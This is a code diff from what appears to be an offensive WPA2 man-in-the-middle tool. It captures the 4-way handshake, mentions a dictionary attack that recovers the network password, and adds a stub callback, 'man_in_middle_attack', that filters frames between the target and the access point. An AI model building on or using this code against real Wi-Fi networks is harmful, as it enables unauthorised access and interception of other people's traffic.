@@ -1,4 +1,3 @@
-#include "ieee80211_data.h"
 #include "l2_packet.h"
 #include "../../MITM.h"
 
@@ -32,19 +31,30 @@ static int parse_auth_data(const char *buf, size_t len,
 	return 0;
 }
 
-uint16_t parse_subtype(uint16_t value) {
-    uint16_t subtype = value & subtype_mask;
-    uint16_t type    = value & type_mask;
-    uint16_t version = value & version_mask;
-    return subtype >> 12 | type >> 6 | version;
-}
-
 uint16_t construct_frame_control(uint8_t version, enum ieee80211_type type, 
                                     enum ieee80211_subtype subtype, enum IEEE80211_FLAGS flags) {
     uint16_t frame_control;
     frame_control = subtype << 12 | type << 10 | version << 8 | flags;
     return htons(frame_control);
 }
+
+static void man_in_middle_attack(void *ctx, const u8 *src_addr, const char *buf, size_t len) {
+  struct MITM *MITM = (struct MITM *)ctx;
+  u32 offset;
+  u16 fc;
+  struct ieee80211_hdr_3addr *hdr;
+  /* If the packet is not come from the target or access point, drop this packet.  */
+  if (memcmp(src_addr, MITM->encry_info.SA, ETH_ALEN) && 
+      memcmp(src_addr, MITM->encry_info.AA, ETH_ALEN))
+    return;
+
+  offset = ((struct ieee80211_radiotap_header *)buf)->it_len;
+  hdr = (struct ieee80211_hdr_3addr*) (buf + offset);
+  fc = ntohs(hdr->frame_control);
+
+  if (WLAN_PARSE_TYPE(fc) == IEEE80211_DATA_TYPE){}
+}
+
 static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet *packet) {
 	/* XXX : How to make sure the handshake packet is the same process ? */
 	/* frame 2 of 4-way handshake */
@@ -97,6 +107,7 @@ static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet
 						info->SSID, info->password);
 				*state = MITM_state_ready;
 				info->enough = 0;
+                l2_packet_change_callback(MITM->l2_packet, man_in_middle_attack);
 			} else {
 				log_printf(MSG_DEBUG, "Dictionary attack failed\n");
 				return -1;
@@ -154,8 +165,8 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 	offset = ((struct ieee80211_radiotap_header *)buf)->it_len;
 
 	if (offset > len) return;
-	type = parse_subtype(ntohs(*(uint16_t *)(buf + offset)));
-	switch (type) {
+	type = WLAN_PARSE_SUBTYPE(ntohs(*(uint16_t *)(buf + offset)));
+  switch (type) {
 		case IEEE80211_BEACON :;
 			/* XXX : Do we only maintance ap list in ap search state ?
 			 * or we should do this always?*/
